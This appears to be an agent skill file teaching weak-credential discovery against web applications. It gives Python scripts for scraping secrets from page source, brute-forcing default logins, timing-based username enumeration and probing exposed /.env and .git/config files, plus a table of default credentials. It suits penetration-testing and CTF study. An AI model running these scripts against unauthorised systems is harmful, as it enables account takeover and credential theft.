---
name: weak-credential-discovery
description: Finding exposed credentials in HTML source, default passwords, and username enumeration across web applications
---

# Weak Credential Discovery

Applications frequently leak credentials in source code, HTML comments, JavaScript, API responses, or error messages. This is one of the highest-ROI attack vectors because it is quick, low-noise, and often yields immediate authentication.

## HTML and Source Inspection

**Always inspect page source and JS files first:**
- `<!-- TODO: delete test account admin:admin123 -->` - dev comments
- Hidden form fields: `<input type="hidden" name="password" value="...">`
- Hardcoded credentials in inline JS: `const API_KEY = "..."`, `auth: btoa("user:pass")`
- Config objects: `window.config = {username: "...", password: "..."}`

**Tool pattern:**
```python
import requests, re

r = requests.get("http://target/")
# Find HTML comments
comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
# Find password-like strings
creds = re.findall(r'(?:password|passwd|pass|secret|key|token)["\s:=]+(["\']?)([^"\'<>\s]{4,})\1', r.text, re.IGNORECASE)
# Find base64 in JS
b64 = re.findall(r'btoa\(["\']([^"\']+)["\']\)', r.text)
```

**Check all JS files:**
```python
from bs4 import BeautifulSoup
soup = BeautifulSoup(r.text, 'html.parser')
for script in soup.find_all('script', src=True):
    js = requests.get(f"http://target{script['src']}").text
    # search js for secrets
```

## Default Credential Testing

**Priority list for web frameworks:**
| Framework/Tech | Common Defaults |
|----------------|-----------------|
| admin panels | admin:admin, admin:password, admin:1234 |
| Flask/Django dev | test:test, user:user, root:root |
| WordPress | admin:admin, admin:password |
| phpMyAdmin | root: (empty), root:root |
| Jenkins | admin:admin, admin:password |
| Grafana | admin:admin |
| Kibana | elastic:changeme |

**Automated testing:**
```python
import requests

creds = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("test", "test"), ("user", "user"), ("root", "root"),
    ("guest", "guest"), ("demo", "demo"), ("admin", ""),
]
for user, pwd in creds:
    r = requests.post("http://target/login", data={"username": user, "password": pwd})
    if "dashboard" in r.url or "logout" in r.text or r.status_code == 302:
        print(f"SUCCESS: {user}:{pwd}")
```

## Username Enumeration

**Detection channels:**
- Different error messages: "User not found" vs "Wrong password"
- Response time differences (timing attack)
- HTTP status code differences (200 vs 401 vs 403)
- Redirect behaviour differences

**Enumerate via timing:**
```python
import requests, time

valid_users = []
for user in ["admin", "test", "john", "user1", "root"]:
    start = time.time()
    r = requests.post("/login", data={"username": user, "password": "wrongpassword"})
    elapsed = time.time() - start
    resp_info = (r.status_code, len(r.text), elapsed, "password" in r.text.lower())
    print(f"{user}: {resp_info}")
```

## API and Config File Exposure

**Common credential locations:**
- `/.env` - `DB_PASSWORD=...`, `SECRET_KEY=...`
- `/config.json`, `/config.yaml`, `/settings.py`
- `/api/v1/users/me` - may include password hash or token
- `/api/config` - may expose internal credentials
- `/phpinfo.php` - exposes environment variables
- `/.git/config` - may contain remote URLs with credentials

**Probe these paths:**
```python
paths = ["/.env", "/config.json", "/.git/config", "/phpinfo.php",
         "/api/config", "/admin/config", "/settings.json",
         "/web.config", "/application.properties"]
for p in paths:
    r = requests.get(f"http://target{p}")
    if r.status_code == 200 and len(r.text) > 50:
        print(f"[{r.status_code}] {p} ({len(r.text)} bytes)")
```

## Post-Authentication Token/Cookie Analysis

After logging in, decode and inspect:
- Session cookies (Flask: base64 payload, JWT: base64 claims)
- Auth tokens in localStorage/sessionStorage (check JS)
- Hidden fields containing user_id or role values

```python
import base64, json
cookie = session.cookies.get("session", "")
# Flask session decode
payload = cookie.split(".")[0]
payload += "=" * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
print(json.loads(decoded))  # {"user_id": 10032, "role": "user"}
```

## Pro Tips

1. Read every HTML comment - developers routinely leave credentials and TODO notes
2. Check JavaScript files for API keys, hardcoded passwords, and test accounts
3. Test default credentials BEFORE any other attack vector - it costs almost nothing
4. Different error messages on login = username enumeration vulnerability
5. Look for exposed config files and `.env` - they're frequently found in CTFs and real apps
6. After logging in, always decode the session/cookie to understand the auth model
